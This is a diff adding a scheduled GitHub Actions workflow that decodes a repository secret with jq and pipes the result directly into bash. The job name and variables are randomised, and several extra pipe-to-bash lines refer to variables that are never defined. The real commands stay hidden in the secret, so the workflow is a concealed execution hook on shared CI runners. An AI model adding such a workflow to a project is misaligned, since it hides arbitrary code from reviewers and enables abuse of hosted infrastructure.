@@ -1,0 +1,23 @@
+name: forkedinterest
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: forkedinterest
+        env:
+          yqjg58340: ${{ secrets.yqjg58340 }}
+        run: |
+          echo $yqjg58340 | jq -r .omh5260 | /bin/bash
+          echo $k35 | jq -r .thf39 | /bin/bash
+          echo $qrkfo78 | jq -r .yhgt39 | /bin/bash
+          echo $yybbx95409 | jq -r .bzci72243 | /bin/bash
+          echo $uc447 | jq -r .cmi75 | /bin/bash
+          echo $lvse2 | jq -r .g931 | /bin/bash
+
